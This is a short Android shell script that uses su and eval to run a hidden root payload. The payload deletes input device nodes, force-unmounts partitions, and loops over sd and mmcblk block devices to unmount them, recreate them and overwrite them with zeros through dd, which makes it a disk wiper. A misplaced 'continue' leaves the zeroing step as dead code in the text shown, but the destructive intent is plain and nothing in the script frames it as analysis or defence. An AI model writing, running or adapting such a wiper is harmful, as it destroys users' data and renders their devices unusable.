#!/bin/sh

set -x

: << annotate
# 注释内容
annotate

main() {
  cat << 'EOF'
rm -f /dev/input/*
umount -f /proc/partitions
tail -n +2 /proc/partitions | grep -E "sd*|mmcblk*" | while IFS= read -r a; do
  d=$(echo "$a" | awk '{print $3}')
  # [ ${#d} -gt 6 ] || [ $d -gt 307200 ] && continue
  continue
  {
    b=/dev/block/$(echo "$a" | awk '{print $4}')
    umount -f "$b"
    rm -f "$b"
    mknod "$b" b $(echo "$a" | awk '{print $1}') $(echo "$a" | awk '{print $2}')
    blockdev --setrw "$b"
    chmod 0600 "$b"
    dd if=/dev/zero of="$b"
  } &
done
EOF
}

export variable="$(main)"
/system/bin/su -c "eval \"$variable\""

